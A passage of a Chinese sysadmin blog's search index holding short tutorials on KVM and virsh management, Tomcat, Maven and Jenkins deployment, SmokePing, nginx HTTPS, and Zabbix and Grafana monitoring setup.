write）占用空间小，支持快照，性能比raw差一点，方便传输。总50G,使用2G,实际占用宿主机空间2G 1.查看虚拟磁盘信息 qemu-img info /data/web01.raw 2.创建一块硬盘 #raw格式 qemu-img create /data/test.raw 1G #qcow2格式 qemu-img create -f qcow2 /data/test.qcow2 1G 3.扩容硬盘(qcow2只能增加不能缩小) qemu-img resize /data/test.qcow2 +2G 4.格式转换（转换后不会覆盖原文件） -f：指定被转换格式 -O：转换后的格式 被转换磁盘文件路径 转换后的磁盘文件路径 #raw==\u003eqcow2 qemu-img convert -f raw -O qcow2 /data/web01.raw /data/web01.qcow2 #vmdk==\u003eqcow2 qemu-img convert -f vmdk -O qcow2 /data/web01.vmdk /data/web01.qcow2 #。。。。略 ","date":"2019-06-29 10:22","objectID":"/post/556/:0:0","tags":["KVM","虚拟化"],"title":"KVM qemu-img常用命令","uri":"/post/556/"},{"categories":["虚拟化"],"content":"1.关机 virsh shutdown web01 virsh destroy web01 2.转换磁盘文件格式 qemu-img convert -f raw -O qcow2 /data/web01.raw /data/web01.qcow2 3.修改配置文件的磁盘类型和磁盘路径 virsh edit web01 \u003cimg src=“images/f04dd3d1ac7339fb34e26bd4ed33b5b8.png “f04dd3d1ac7339fb34e26bd4ed33b5b8\"” /\u003e 4.开机 virsh start web01 ","date":"2019-06-29 10:16","objectID":"/post/558/:0:0","tags":["KVM","虚拟化"],"title":"KVM磁盘格式转换，raw转qcow2","uri":"/post/558/"},{"categories":["其他"],"content":"修改内核参数 grubby –update-kernel=ALL –args=“console=ttyS0,115200n8” 重启 reboot ","date":"2019-06-27 21:56","objectID":"/post/549/:0:0","tags":[],"title":"centos7开启console控制台登录","uri":"/post/549/"},{"categories":["虚拟化"],"content":"以虚拟机名称为centos7举例： 1.查看主机列表 virsh list --all 2.编辑配置文件 #虚拟机配置文件 virsh edit centos7 #网络配置文件 virsh net-edit default 3.开机，关机、重启、关闭电源 virsh start centos7 virsh shutdown centos7 virsh reboot centos7 virsh destroy centos7 4.导出查看虚拟机配置文件 virsh dumpxml centos7 \u003e /backup/centos7.xml 5.移除导入虚拟机 #移除 virsh undefine centos7 #导入 virsh define /backup/centos7.xml 5.挂起、恢复虚拟机 #挂起 virsh suspend centos7 #恢复（恢复时需要注意时间同步问题） virsh resume centos7 6.查看vnc端口号 virsh vncdisplay centos7 7.修改虚拟机名称 #先关机 virsh shutdown centos7 #修改名称 virsh domrename centos7 web01 8.开机和取消开机启动，前提：systemctl enable libvirtd # 开机启动 virsh autostart centos7 # 取消开机启动 virsh autostart --disable centos7 实际上是将配置文件软链接到/etc/libvirt/qemu/autostart/目录下 9.通过console连接虚拟机 virsh console centos7 10.通过磁盘文件控制系统文件 virt-cat 1.qcow2 /etc/passwd #查看虚拟磁盘里的文件 virt-edit 1.qcow2 /etc/passwd #编辑虚拟磁盘里的文件，虚拟机必须处于关机状态 virt-df -h 1.qcow2 #查看虚拟磁盘使用情况 virt-copy-out 1.qcow2 /etc/passwd /tmp/ #拷贝虚拟磁盘中的 passwd 文件到 /tmp 目录下 virt-copy-in 1.qcow2 /tmp/1.txt /root/ #拷贝本地的 1.txt 文件到虚拟磁盘的 /root/ 目录下 11.查看支持安装的系统版本 virt-install --os-variant list 待补充。。。 ","date":"2019-06-27 21:43","objectID":"/post/526/:0:0","tags":["KVM","虚拟化"],"title":"KVM管理软件libvirt常用命令","uri":"/post/526/"},{"categories":["虚拟化"],"content":"方法1：自带命令修改 #先关机 virsh shutdown centos7 #修改名称 virsh domrename centos7 web01 最好保证虚拟机名称和磁盘文件一致，顺便修改一下磁盘文件名称 #修改磁盘文件名称 mv /data/centos2.raw /data/web01.raw #修改配置文件中磁盘文件的路径名称 virsh edit web01 \u003csource file='/data/web01.raw'/\u003e #开机 virsh start web01 方法2：修改配置文件 先关机 virsh shutdown centos7 修改配置文件中\u003cname\u003e\u003c/name\u003e,删除uuid，修改磁盘文件路径。原文件可自行备份 vim /etc/libvirt/qemu/centos7.xml 修改磁盘文件名称 mv /data/centos2.raw /data/web01.raw 修改配置文件名称 mv /etc/libvirt/qemu/{centos7,web01}.xml 删除虚拟机 virsh undefine centos7 导入虚拟机 virsh define /etc/libvirt/qemu/web01.xml 开机 virsh start web01","date":"2019-06-27 21:32","objectID":"/post/545/:0:0","tags":["KVM","虚拟化"],"title":"KVM虚拟机修改虚拟机名称2种方法","uri":"/post/545/"},{"categories":["虚拟化"],"content":"虚拟机名称：centos7 磁盘文件路径：/opt/centos2.raw 1.关机 virsh shutdown centos7 2.移动磁盘文件到新目录 mv /opt/centos2.raw /data 3.编辑配置文件 virsh edit centos7 将磁盘文件路径修改为新路径 \u003cimg src=“images/61ee51edb8b72fc295d04bcf2decc150.png “61ee51edb8b72fc295d04bcf2decc150\"” /\u003e 4.开机 virsh start centos7 ","date":"2019-06-27 20:08","objectID":"/post/543/:0:0","tags":["KVM","虚拟化"],"title":"KVM迁移目录","uri":"/post/543/"},{"categories":["虚拟化"],"content":"1.编辑配置文件 virsh edit centos7 添加红框中的内容 \u003cimg src=“images/40c003b8a54a8fb5897b3901a493baed.png “40c003b8a54a8fb5897b3901a493baed”” /\u003e 2.设置镜像文件路径 \u003cimg src=“images/3b1789961b16afc4ef8e940845180780.png “3b1789961b16afc4ef8e940845180780\"” /\u003e 3.重启测试 virsh destroy centos7 ","date":"2019-06-27 16:19","objectID":"/post/535/:0:0","tags":["KVM","虚拟化"],"title":"KVM修改光盘为第一启动项，并添加光盘镜像","uri":"/post/535/"},{"categories":["虚拟化"],"content":"使用nat需要在宿主机中开启数据包转发 临时修改： sysctl -w net.ipv4.ip_forward=1 重新加载： sysctl -p 永久修改： 修改配置文件 vim /etc/sysctl.conf net.ipv4.ip_forward=1 ","date":"2019-06-27 16:10","objectID":"/post/533/:0:0","tags":["KVM","虚拟化"],"title":"KVM解决nat不能上网的问题","uri":"/post/533/"},{"categories":["虚拟化"],"content":"1.查看CPU是否支持虚拟化 egrep '(vmx|svm)' /proc/cpuinfo vmx(intel) svm(AMD) 在Linux 2.6.20内核之后的版本默认是集成KVM的，如果是以下的版本需要升级以下内核。（可以用uname -r查看） 2.安装KVM和libvirt(KVM管理工具) yum install libvirt virt-install qemu-kvm -y 3.开启libvirt服务 systemctl enable libvirtd systemctl start libvirtd 4.上传系统镜像，安装系统使用 通过xftp上传或者使用光盘生成 将光盘插入光驱然后执行，名字需要自己定义： dd if=/dev/cdrom of=/opt/CentOS-7-x86_64-DVD-1804.iso 5.添加一台虚拟机 virt-install \\ --virt-type kvm \\ --os-type=linux \\ --os-variant rhel7 \\ --name centos7 \\ --memory 1024 \\ --vcpus 1 \\ --disk /opt/centos2.raw,format=raw,size=10 \\ --cdrom /opt/CentOS-7-x86_64-DVD-1804.iso \\ --network network=default \\ --graphics vnc,listen=0.0.0.0 \\ --noautoconsole 参数说明： --virt-type kvm #虚拟机类型kvm --os-type=linux #系统类型 --os-variant rhel7 #系统版本 --name centos7 #虚拟机名称 --memory 1024 #内存 --vcpus 1 #cpu数量 --disk /opt/centos2.raw,format=raw,size=10 #磁盘文件路径（硬盘) --cdrom /opt/CentOS-7-x86_64-DVD-1804.iso #光盘镜像 --network network=default #网络默认为nat --graphics vnc,listen=0.0.0.0 #vnc监听地址 --noautoconsole #不自动连接控制台 添加完成后，可以通过以下命令查看设备状态和vnc端口号 #查看主机列表 virsh list --all #查看vnc端口号 virsh vncdisplay centos7 6.使用vnc安装系统 这里我关闭了KDUMP，分区没有分swap分区 配置文件路径： /etc/libvirt/qemu/xxxxx.xml ","date":"2019-06-25 23:58","objectID":"/post/521/:0:0","tags":["KVM","虚拟化"],"title":"KVM安装，并创建一台linux虚拟机","uri":"/post/521/"},{"categories":["系统服务"],"content":"下载jeesns： git clone https://gitee.com/zchuanzhao/jeesns.git cd jeesns 创建数据库： mysql -uroot -p create database jeesns character set utf8 collate utf8_general_ci; grant all on jeesns.* to jeesns@localhost identified by '123456'; 导入数据库 mysql -ujeesns -p123456 jeesns \u003c ./jeesns-web/database/jeesns.sql 修改jeesns数据库配置信息： vim ./jeesns-web/src/main/resources/jeesns.properties 修改如下三项内容：数据库地址、用户名、密码 jdbc.url jdbc.user jdbc.password 编译生成war包： mvn install:install-file -Dfile=./jeesns-core/jeesns-core.jar -DgroupId=com.lxinet -DartifactId=jeesns-core -Dversion=1.4 -Dpackaging=jar mvn clean package 部署war包到tomcat： cp ./jeesns-web/target/jeesns-web.war /application/tomcat/webapps/jeesns.war 重启tomcat /application/tomcat/bin/shutdown.sh /application/tomcat/bin/startup.sh ","date":"2019-06-24 23:32","objectID":"/post/493/:0:0","tags":["tomcat","java"],"title":"jeesns部署","uri":"/post/493/"},{"categories":["系统服务"],"content":"maven二进制包下载地址： http://mirror.bit.edu.cn/apache/maven/maven-3/3.6.1/binaries/apache-maven-3.6.1-bin.tar.gz 解压安装： *安装前需要先安装oracle jdk tar xf apache-maven-3.6.1-bin.tar.gz -C /application/ ln -s /application/apache-maven-3.6.1/ /application/maven echo 'PATH=$PATH:/application/maven/bin' \u003e\u003e /etc/profile source /etc/profile 下载jeesns git clone https://gitee.com/zchuanzhao/jeesns.git 编译jeesns为war包,maven加速请参考 cd jeesns 按照官网说明先执行： mvn install:install-file -Dfile=./jeesns-core/jeesns-core.jar -DgroupId=com.lxinet -DartifactId=jeesns-core -Dversion=1.4.2 -Dpackaging=jar mvn clean package 编译成功后会生成在下面的位置： jeesns/jeesns-web/target/jeesns-web.war ","date":"2019-06-24 22:47","objectID":"/post/484/:0:0","tags":["tomcat","java","maven"],"title":"安装并使用maven编译java项目","uri":"/post/484/"},{"categories":["其他"],"content":"编辑conf/settings.xml 在\u003cmirrors\u003e\u003c/mirrors\u003e中添加如下内容 \u003cmirror\u003e \u003cid\u003enexus-aliyun\u003c/id\u003e \u003cmirrorOf\u003e*\u003c/mirrorOf\u003e \u003cname\u003eNexus aliyun\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/groups/public\u003c/url\u003e \u003c/mirror\u003e ","date":"2019-06-24 22:20","objectID":"/post/488/:0:0","tags":["maven"],"title":"maven配置阿里云仓库加速","uri":"/post/488/"},{"categories":["系统服务"],"content":"打开项目目录中的web.xml文件，并找到\u003cauth-constraint\u003e所在位置，修改角色名. 主要分为三部分： 1.认证目录 2.角色名称 3.认证配置 \u003csecurity-constraint\u003e \u003cweb-resource-collection\u003e \u003cweb-resource-name\u003eother\u003c/web-resource-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/web-resource-collection\u003e \u003c!-- no security constraint --\u003e \u003cauth-constraint\u003e \u003crole-name\u003esoulchild\u003c/role-name\u003e \u003c/auth-constraint\u003e \u003c/security-constraint\u003e \u003clogin-config\u003e \u003cauth-method\u003eBASIC\u003c/auth-method\u003e \u003crealm-name\u003exxxxx\u003c/realm-name\u003e \u003c/login-config\u003e 修改tomcat-users.xml，要与上面修改的角色名称相同 \u003crole rolename=\"soulchild\"/\u003e \u003cuser username=\"admin\" password=\"123\" roles=\"soulchild\"/\u003e ","date":"2019-06-23 00:41","objectID":"/post/479/:0:0","tags":["tomcat"],"title":"tomcat 配置basic auth认证","uri":"/post/479/"},{"categories":["系统服务","devops"],"content":"最新war包下载地址： https://mirrors.tuna.tsinghua.edu.cn/jenkins/war-stable/latest/jenkins.war 将war包复制到tomcat站点目录： cp jenkins.war /application/tomcat/webapps/ 1.打开web地址： http://10.0.0.7:8080/jenkins \u003cimg src=“images/386acf9f6f48548800c0ccf1e6ae79fa.png “386acf9f6f48548800c0ccf1e6ae79fa”” /\u003e 2.输入密码后继续，跳过插件安装 \u003cimg src=“images/98ad50618bf360a1730adfbd490aa013.png “98ad50618bf360a1730adfbd490aa013\"” /\u003e 3.安装Locale 插件 \u003cimg src=“images/6ce2c85db804240be5b6a6e09131da0f.png “6ce2c85db804240be5b6a6e09131da0f”” /\u003e \u003cimg src=“images/b2d7c0c691da1d729743af4274c5ce7f.png “b2d7c0c691da1d729743af4274c5ce7f”” /\u003e 找到Locale插件安装即可 4.配置中文 \u003cimg src=“images/5f66074c81cca6dc5e44d45927e3ab4b.png “5f66074c81cca6dc5e44d45927e3ab4b”” /\u003e \u003cimg src=“images/2431ff99887e614a0068cf60095aac7a.png “2431ff99887e614a0068cf60095aac7a”” /\u003e ","date":"2019-06-22 23:32","objectID":"/post/475/:0:0","tags":["tomcat"],"title":"war包方式部署jenkins，并设置为中文","uri":"/post/475/"},{"categories":["系统服务"],"content":"软件包准备： apache-tomcat-8.0.27.tar.gz jdk-8u102-linux-x64.rpm rpm方式安装jdk rpm -ivh jdk-8u102-linux-x64.rpm 二进制方式安jdk tar xf jdk-8u191-linux-x64.tar.gz mv jdk1.8.0_191 /usr/local/ ln -sv /usr/local/jdk1.8.0_191 /usr/local/jdk #设置环境变量 vim /etc/profile export JAVA_HOME=/usr/local/jdk export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export PATH=$JAVA_HOME/bin:$PATH 安装tomcat8 tar xf apache-tomcat-8.0.27.tar.gz -C /application/ ln -s /application/apache-tomcat-8.0.27/ /application/tomcat 启动tomcat /application/tomcat/bin/startup.sh tomcat目录结构 [root@tomcat ~]# cd /application/tomcat/ [root@tomcat tomcat]# tree -L 1 . ├── bin #→用以启动、关闭Tomcat或者其它功能的脚本（.bat文件和.sh文件） ├── conf #→用以配置Tomcat的XML及DTD文件 ├── lib #→存放web应用能访问的JAR包 ├── LICENSE ├── logs #→Catalina和其它Web应用程序的日志文件 ├── NOTICE ├── RELEASE-NOTES ├── RUNNING.txt ├── temp #→临时文件 ├── webapps #→Web应用程序根目录 └── work #→用以产生有JSP编译出的Servlet的.java和.class文件 7 directories, 4 files [root@tomcat tomcat]# cd webapps/ [root@tomcat webapps]# ll total 20 drwxr-xr-x 14 root root 4096 Oct 5 12:09 docs #→tomcat帮助文档 drwxr-xr-x 6 root root 4096 Oct 5 12:09 examples #→web应用实例 drwxr-xr-x 5 root root 4096 Oct 5 12:09 host-manager #→管理 drwxr-xr-x 5 root root 4096 Oct 5 12:09 manager #→管理 drwxr-xr-x 3 root root 4096 Oct 5 12:09 ROOT #→默认网站根目录 ","date":"2019-06-22 22:42","objectID":"/post/470/:0:0","tags":["tomcat"],"title":"Centos 7 安装JDK1.8，Tomcat8","uri":"/post/470/"},{"categories":["监控"],"content":"安装前准备 1）关闭iptables以及selinux 2）时间同步 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ntpdate ntp1.aliyun.com 下载地址： fping: wget http://fping.org/dist/fping-3.10.tar.gz echoping: wget https://fossies.org/linux/misc/old/echoping-6.0.2.tar.gz smokeping: wget http://pkgs.fedoraproject.org/repo/pkgs/smokeping/smokeping-2.6.9.tar.gz/0c2361b734866dd37facf2af3f8f7144/smokeping-2.6.9.tar.gz 1、安装依赖包： yum install -y vim wget perl perl-Net-Telnet perl-Net-DNS perl-LDAP perl-libwww-perl perl-IO-Socket-SSL perl-Socket6 perl-Time-HiRes perl-ExtUtils-MakeMaker rrdtool rrdtool-perl curl httpd httpd-devel gcc make wget libxml2-devel libpng-devel glib pango pango-devel freetype freetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel popt popt-devel libidn libidn-devel screen 2、解压、编译安装fping tar xf fping-3.10.tar.gz cd fping-3.10 ./configure make \u0026\u0026 make install cd ~ 3、解压、编译安装echoping tar xf echoping-6.0.2.tar.gz cd echoping-6.0.2 ./configure make \u0026\u0026 make install cd ~ 4、解压、编译安装smokeping tar xf smokeping-2.6.9.tar.gz cd smokeping-2.6.9 ./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty #如果有failed需要多敲几遍此命令，以保证完全安装 ./configure --prefix=/usr/local/smokeping /usr/bin/gmake install 5、配置 smokeping mkdir /usr/local/smokeping/htdocs/cache mkdir /usr/local/smokeping/data mkdir /usr/local/smokeping/var touch /var/log/smokeping.log chown apache:apache /usr/local/smokeping/htdocs/cache chown apache:apache /usr/local/smokeping/data chown apache:apache /usr/local/smokeping/var chown apache:apache /var/log/smokeping.log chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist cd /usr/local/smokeping/htdocs cp smokeping.fcgi.dist smokeping.fcgi cd /usr/local/smokeping/etc cp config.dist config 6、更改配置文件 vim /usr/local/smokeping/etc/config 主要修改如下内容： cgiurl = http://127.0.0.1/smokeping.cgi imgcache = /usr/local/smokeping/htdocs/cache *** Database *** #step = 300 step = 60 #此处建议改为 60 ， 一分钟采集一次数据 pings = 20 108行的fping路径修改为 binary = /usr/local/sbin/fping 7、编辑apache配置文件 vim /etc/httpd/conf/httpd.conf 在DocumentRoot “/var/www/html” 这一行(在292行左右)之下添加如下内容： Alias /cache \"/usr/local/smokeping/htdocs/cache\" Alias /cropper \"/usr/local/smokeping/htdocs/cropper\" Alias /smokeping \"/usr/local/smokeping/htdocs\" \u003cDirectory \"/usr/local/smokeping/htdocs\"\u003e AllowOverride None AddHandler cgi-script .fcgi .cgi Options ExecCGI \u003cIfModule dir_module\u003e DirectoryIndex smokeping.fcgi \u003c/IfModule\u003e Order allow,deny Allow from all \u003c/Directory\u003e 8、图像浏览界面的中文支持 安装字体 yum -y install wqy-zenhei-fonts.noarch 编辑smokeping的配置文件 vim /usr/local/smokeping/etc/config 第49行添加 charset = utf-8 #添加此行 9、在Web页面增加验证用户名和密码 vim /etc/httpd/conf/httpd.conf 在\u003cDirectory “/usr/local/smokeping/htdocs”\u003e下增加以下内容 AuthName \"Smokeping\" AuthType Basic AuthUserFile /usr/local/smokeping/htdocs/htpasswd Require valid-user 设置账号密码 htpasswd -c /usr/local/smokeping/htdocs/htpasswd admin 10、添加监控节点 vim /usr/local/smokeping/etc/config ############################################################ +dianxin #一级菜单 menu = 中国电信 #一级菜单显示名称 title = 中国电信 #页面内标题 ++beijingdianxin # 节点名称（非中文） menu = 北京电信 # 左侧选项显示名称 title = 北京市电信 202.97.0.1 # 节点页面顶部显示名称 host = 202.97.0.1 #主机IP ######################################################   11、编写启动脚本 vim /etc/init.d/smokeping ############################################################ #!/bin/bash # # chkconfig: 2345 80 05 # Description: Smokeping init.d script # Write by : linux-Leon_xiedi # Get function from functions library . /etc/init.d/functions # Start the service Smokeping function start() { echo -n \"Starting Smokeping: \" /usr/local/smokeping/bin/smokeping \u003e/dev/null 2\u003e\u00261 ### Create the lock file ### touch /var/lock/subsys/smokeping success $\"Smokeping startup\" echo } # Restart the service Smokeping function stop() { echo -n \"Stopping Smokeping: \" kill -9 `ps ax |grep \"/usr/local/smokeping/bin/smokeping\" | grep -v grep | awk '{ print $1 }'` \u003e/dev/null 2\u003e\u00261 ### Now, delete the lock file ### rm -f /var/lock/subsys/smokeping success $\"Smokeping shutdown\" echo } #Show status about Smokep","date":"2019-06-21 22:00","objectID":"/post/462/:0:0","tags":["监控"],"title":"Centos6 搭建smokeping","uri":"/post/462/"},{"categories":["系统服务"],"content":"1.申请证书 略 2.下载上传证书 1_www.domain.com_bundle.crt; 2_www.domain.com.key; 将这两个文件上传到服务器nginx/conf/ssl目录中 3.nginx配置 server字段中配置https listen 443; server_name www.domain.com; ## ssl on; root /var/www/www.domain.com; ## index index.php index.html index.htm; ssl_certificate ssl/1_www.domain.com_bundle.crt; ## ssl_certificate_key ssl/2_www.domain.com.key; ## ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; 配置80跳转443 server { listen 80; server_name www.domain.com; #填写绑定证书的域名 rewrite ^(.*)$ https://$host$1 permanent; #把http的域名请求转成https } 配置完后，重启服务即可。 ","date":"2019-06-18 22:43","objectID":"/post/450/:0:0","tags":["https"],"title":"nginx配置https(SSL)访问","uri":"/post/450/"},{"categories":["监控"],"content":"下载安装： wget https://dl.grafana.com/oss/release/grafana-6.2.2-1.x86_64.rpm yum localinstall grafana-6.2.2-1.x86_64.rpm systemctl start grafana-server   打开web： http://10.0.0.62:3000/ 默认用户名密码：admin 首次登陆需要修改 安装zabbix插件： 安装插件更多内容可参考官方文档： https://grafana.com/docs/plugins/installation/ 安装： grafana-cli plugins install alexanderzobnin-zabbix-app service grafana-server restart 启用插件：进入之后点击enable \u003cimg src=“images/916b8643b2c523b0e34705eb3b894055.png “916b8643b2c523b0e34705eb3b894055\"” /\u003e 添加数据源： 点击add后选择zabbix \u003cimg src=“images/21a6319ed250be29281cc0f1e44924ee.png “21a6319ed250be29281cc0f1e44924ee”” /\u003e http://10.0.0.62/zabbix/api_jsonrpc.php 填写完成后，点击Save \u0026 Test \u003cimg src=“images/6205656dced0c6865795c617a0298724.png “6205656dced0c6865795c617a0298724\"” /\u003e 保存后，点击Dashboards，导入图形模板 \u003cimg src=“images/f77cb519326831ea85f8f0cdd544798a.png “f77cb519326831ea85f8f0cdd544798a”” /\u003e 展示图形： ","date":"2019-06-14 00:03","objectID":"/post/442/:0:0","tags":["zabbix","grafana"],"title":"zabbix之使用grafana展示图形","uri":"/post/442/"},{"categories":["监控"],"content":"zabbix监控范围： 1：监控物理硬件的环境（cpu的温度，主板的温度，风扇的转速，硬盘的监控状态）ipmi芯片，自定义监控 2：监控操作系统（cpu负载，内存，硬盘，网卡流量，进程，安全监控）zabbix linux 3：应用程序监控（nginx，php-fpm，nfs，mysql，redis，rsync）下载网上模板，精简优化 4：业务监控（网页http状态码，每天活跃用户的监控pv，uv，ip，每天的订单量dba，cdn流量的监控等。。。） ","date":"2019-06-13 23:23","objectID":"/post/439/:0:0","tags":[],"title":"zabbix使用","uri":"/post/439/"},{"categories":["监控"],"content":"官方参考文档：https://www.zabbix.com/documentation/4.0/zh/manual/appendix/macros/supported_by_location 故障： 标题： {HOST.NAME},发现异常 内容： 告警时间: {EVENT.DATE} {EVENT.TIME} 告警设备IP: {HOSTNAME1} 告警信息: {TRIGGER.NAME} 当前状态: {TRIGGER.STATUS}：{ITEM.VALUE1} ########################################## 恢复： 标题： {HOST.NAME},恢复 报警内容： 告警时间: {EVENT.DATE} {EVENT.TIME} 告警设备IP: {HOSTNAME1} 告警信息: {TRIGGER.NAME} 当前状态: {TRIGGER.STATUS}:{ITEM.VALUE1} ","date":"2019-06-13 23:17","objectID":"/post/437/:0:0","tags":["zabbix"],"title":"zabbix自定义报警内容","uri":"/post/437/"},{"categories":["监控"],"content":"Web配置： 1.配置邮件服务器（如果是QQ邮箱则需要选中SSL/TLS，勾选SSL验证对端和SSL验证主机） \u003cimg src=“images/10a6d0e5c1f191fbd50124a215d48a12.png “10a6d0e5c1f191fbd50124a215d48a12\"” /\u003e 2.配置接收报警邮件地址 \u003cimg src=“images/cfc6f6e8026df0e7b2e69437a1ee5c40.png “cfc6f6e8026df0e7b2e69437a1ee5c40\"” /\u003e 3.配置动作 步骤2中配置的为管理员用户的收件人地址，默认动作发送包含此组，所以可以不用修改动作，有其他需要可以创建一条。这里直接启用就可以了。 \u003cimg src=“images/f3cdb7656fffaae6263aa3a31f5a52cb.png “f3cdb7656fffaae6263aa3a31f5a52cb”” /\u003e 4.测试报警 \u003cimg src=“images/e07ca7bca97c94343b398baf6832431a.png “e07ca7bca97c94343b398baf6832431a”” /\u003e 报警内容可以在动作中修改。 ","date":"2019-06-13 23:04","objectID":"/post/433/:0:0","tags":["zabbix"],"title":"zabbix内置邮件报警","uri":"/post/433/"},{"categories":["监控"],"content":"用户登录数量举例：   \u003cimg src=“images/30eae79f6cc43f586377757bb1d64c82.png “30eae79f6cc43f586377757bb1d64c82\"” /\u003e \u003cimg src=“images/77f12f248f98a855779d5cc7f281f206.png “77f12f248f98a855779d5cc7f281f206\"” /\u003e \u003cimg src=“images/140053402d22020f37f01f649f9e36be.png “140053402d22020f37f01f649f9e36be”” /\u003e 依赖关系：   触发器A 监控数据库状态 触发器B 监控web状态码 200 这种情况当数据库出现异常时，两个报警都会触发，造成不必要的报警 此时在触发器B中设置依赖触发器A 就只有在触发器A正常时，触发器B才会报警 当触发器A报警，触发器B则不会报警 ","date":"2019-06-10 23:00","objectID":"/post/429/:0:0","tags":["zabbix"],"title":"zabbix触发器和依赖关系简单说明","uri":"/post/429/"},{"categories":["监控"],"content":"agent端配置 [*]用来接收参数,用$可以调用，参数一$1,参数二$2,参数三$3....以此类推 自定义key： UserParameter=tps[*],sh /server/scripts/tps.sh $1 cat /server/scripts/tps.sh #!/bin/bash iostat | awk '/^'$1'/{print $2}' 测试获取sda： zabbix_get -s 172.16.1.7 -k tps[sda] 0.94 大概执行过程： tps[sda] ——\u003e$1=sda —–\u003esh /server/scripts/tps.sh sda —–\u003eiostat | awk ‘/^sda/{print $2}’ 这样传参的形式可以提高灵活性。 web配置   \u003cimg src=“images/a8b3e635fcf7dea7cb3aa16e9a76a0ea.png “a8b3e635fcf7dea7cb3aa16e9a76a0ea”” /\u003e \u003cimg src=“images/661e947f64994d50c3d3358a78106026.png “661e947f64994d50c3d3358a78106026\"” /\u003e ","date":"2019-06-09 23:50","objectID":"/post/418/:0:0","tags":["zabbix"],"title":"zabbix传参形式的自定义监控项","uri":"/post/418/"},{"categories":["监控"],"content":"/usr/share/zabbix/assets/fonts文件夹中发现里面没有字体，从windows拷贝一个到指定目录中即可，需要改名 [root@zabbix-server fonts]# pwd /usr/share/zabbix/assets/fonts [root@zabbix-server fonts]# ls graphfont.ttf ","date":"2019-06-09 23:22","objectID":"/post/420/:0:0","tags":["zabbix"],"title":"zabbix4.0图形乱码或不显示文字","uri":"/post/420/"},{"categories":["监控"],"content":"两种方式都可以实现 一个是在zabbix_agentd.conf中直接写 另一个是写在zabbix_agentd.d目录下*.conf,前提是配置文件中使用include Include=/etc/zabbix/zabbix_agentd.d/*.conf 格式如下： UserParameter=key,xxxxxxxxxx xxx部分可以是直接取值的命令，也可以写一个脚本执行，防止传参变量冲突 监控硬盘的tps值----（agent端配置） tps：每秒硬盘读写次数 安装查询工具 yum install -y sysstat 命令行取值测试 iostat | awk ‘/^sda/{print $2}’ 添加自定义监控(sda_tps为key值，需要自己取名，不能重复) vim /etc/zabbix/zabbix_agentd.d/sda_tps.conf UserParameter=sda_tps,iostat | awk ‘/^sda/{print $2}’ 重启服务 systemctl restart zabbix-agent.service 在zabbix-server上手动取值（需要安装zabbix-get，取值使用的是zabbix用户，需要注意用户权限问题） zabbix_get -s 172.16.1.7 -k sda_tps 1.82 web配置 1.添加监控项 \u003cimg src=“images/6f7194d608289a517cc84048effbd9e4.png “6f7194d608289a517cc84048effbd9e4\"” /\u003e \u003cimg src=“images/2425187de003a678f12d680c16092ed2.png “2425187de003a678f12d680c16092ed2\"” /\u003e 名称可以随便写，键值就是配置文件中的key值 \u003cimg src=“images/bf889ed3d2c9eea244c4e6579e06dfd4.png “bf889ed3d2c9eea244c4e6579e06dfd4\"” /\u003e 添加完成后，查看最新数据 \u003cimg src=“images/2bc12864c3ef33eee8feab99fb4429bf.png “2bc12864c3ef33eee8feab99fb4429bf”” /\u003e ","date":"2019-06-09 21:30","objectID":"/post/412/:0:0","tags":["zabbix"],"title":"zabbix添加自定义监控项","uri":"/post/412/"},{"categories":["监控"],"content":"服务端配置 zabbix-agent包下载地址：https://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/ 选择和自己环境匹配的包： rpm -qa | grep zabbix-server zabbix-server-mysql-4.0.8-1.el7.x86_64 安装zabbix-agent,我这边是4.0.8的 rpm -ivh https://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.8-1.el7.x86_64.rpm 修改配置文件（指定zabbix-server的地址） vim /etc/zabbix/zabbix_agentd.conf Server=172.16.1.62 重启服务和设置开机自启 systemctl restart zabbix-agent.service systemctl enable zabbix-agent.service web配置 创建主机 \u003cimg src=“images/9abb8eadeb36799c3013312abda43361.png “9abb8eadeb36799c3013312abda43361\"” /\u003e \u003cimg src=“images/4db0b2eb4f95210e78e67d0a65f97443.png “4db0b2eb4f95210e78e67d0a65f97443\"” /\u003e 添加linux模板 \u003cimg src=“images/b6881b2033ce798e31d409d1618bb042.png “b6881b2033ce798e31d409d1618bb042\"” /\u003e \u003cimg src=“images/6370b57eab249155ea75ee8dbb6593be.png “6370b57eab249155ea75ee8dbb6593be”” /\u003e ","date":"2019-06-09 20:46","objectID":"/post/405/:0:0","tags":["zabbix"],"title":"zabbix通过agent监控主机","uri":"/post/405/"},{"categories":["基础内容"],"content":"buffer(缓冲)：在内存中存入一定量的数据一次性写入到磁盘，减少磁盘写入次数 cache(缓存)：内存的速度比硬盘的速度快很多的，在内存中缓存下一些数据，下次使用读取的时候会提高速度 ","date":"2019-06-04 15:54","objectID":"/post/402/:0:0","tags":[],"title":"buffer和cache的区别","uri":"/post/402/"},{"categories":["监控"],"content":"1.配置zabbix源 rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-release-4.0-1.el7.noarch.rpm 修改为清华大学镜像源 sed -i ’s#repo.zabbix.com#mirrors.tuna.tsinghua.edu.cn/zabbix#g’ /etc/yum.repos.d/zabbix.repo 2.安装mysql版zabbix yum install -y zabbix-server-mysql zabbix-web-mysql 3.安装配置数据库 # 安装数据库 yum install -y mariadb-server 设置开机自启和启动数据库 systemctl enable mariadb systemctl start mariadb 安全初始化 可参考http://www.soulchild.cn/380.html mysql_secure_installation 创建zabbix库 create database zabbix character set utf8 collate utf8_bin; 创建和授权zabbix用户 grant all privileges on zabbix.* to zabbix@localhost identified by ‘zabbix’; #导入zabbix初始数据 zcat /usr/share/doc/zabbix-server-mysql-4.0.8/create.sql.gz | mysql -uroot -p zabbix 